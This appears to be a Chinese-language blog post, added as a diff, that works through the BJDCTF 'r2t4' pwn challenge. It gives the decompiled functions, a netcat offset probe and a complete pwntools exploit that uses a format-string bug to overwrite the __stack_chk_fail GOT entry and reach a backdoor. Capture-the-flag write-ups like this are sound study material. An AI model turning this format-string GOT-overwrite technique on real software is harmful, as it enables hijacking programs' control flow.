@@ -1,0 +1,82 @@
+---
+layout: post
+title:  r2t4
+date:   2021-02-07 00:01:01 +0300
+image:  2021-02-07-pink-dawn.jpg
+tags:   [ctf,PWN,BJDCTF,Fmtstr]
+---
+
+#### main
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [rsp+0h] [rbp-30h]
+  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  read(0, &buf, 0x38uLL);
+  printf(&buf, &buf);
+  return 0;
+}
+```
+
+#### backdoor
+
+```assembly
+unsigned __int64 backdoor()
+{
+  unsigned __int64 v0; // ST08_8
+
+  v0 = __readfsqword(0x28u);
+  system("cat flag");
+  return __readfsqword(0x28u) ^ v0;
+}
+```
+
+main函数显然是一个格式化字符串漏洞，要我们通过该漏洞去执行backdoor()函数，可是怎么样去执行是一个问题。
+
+通过查阅资料得知
+
+__stack_chk_fail()这个函数会在程序出现栈溢出的时候执行，所以利用格式化字符串漏洞把这个函数的got表地址覆盖为后门函数。
+
+定位参数
+
+%hn：word：2bytes
+
+计算偏移量
+
+```assembly
+root@kali1:~/pwn# nc node3.buuoj.cn 25644
+aaaa%x.%x.%x.%x.%x.%x      
+aaaae755590.38.c47d4f81.c48aea40.c48aea40.61616161
+```
+
+#### exp:
+
+```assembly
+# -*-coding:utf-8-*-
+from pwn import *
+
+elf = ELF("./r2t4")
+
+io = remote("node3.buuoj.cn",25644)
+
+stack_chk_fail_got = elf.got["__stack_chk_fail"]
+backdoor       = 0x400626
+
+# 0x40 = 64
+# 0x626 = 1574
+
+payload = "%64c%9$hn%1510c%10$hnaaa"
+# 用a凑成整字
+# 24bit = 3byte
+# 9 = 6+3
+payload += p64(stack_chk_fail_got+2) + p64(stack_chk_fail_got)
+# 造成溢出
+payload = payload.ljust(0x38, 'a')
+io.send(payload)
+
+io.interactive()
+```
+
